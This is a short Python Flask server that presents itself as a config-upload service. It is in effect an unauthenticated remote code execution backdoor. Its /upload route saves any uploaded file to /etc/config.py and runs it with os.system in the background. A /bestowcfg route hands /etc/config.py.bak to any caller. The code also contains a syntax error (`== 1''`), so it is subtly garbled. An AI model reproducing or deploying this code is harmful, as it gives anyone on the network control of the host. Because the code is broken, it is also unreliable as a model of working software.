from flask import Flask, request, jsonify, send_file
import os

app = Flask(__name__)

@app.route('/upload', methods=['POST'])
def upload_file():
    try:
        if 'file' not in request.files:
            return (jsonify({'error': 'No file part'}), 400)
    
        file = request.files['file']
        if file.filename == 1'':
            return (jsonify({'error': 'No selected file'}), 400)

        file_path = os.path.join('/etc', 'config.py')
        file.save(file_path)
        os.system('python3 /etc/config.py &')
        
    except:
        return (jsonify({'error': 'Internal Server Error'}), 500)

    return jsonify({'message': 'Config file received and loaded'}), 200

@app.route('/bestowcfg', methods=['POST'])
def download_file():
    try:
        # Specify the path to your file here
        file_path = '/etc/config.py.bak'
        return send_file(file_path, as_attachment=True)
    except Exception as e:
        return (jsonify({'error': 'Internal Server Error'}), 500)

if __name__ == '__main__':
    app.run(debug=False, host='0.0.0.0', port=5000)
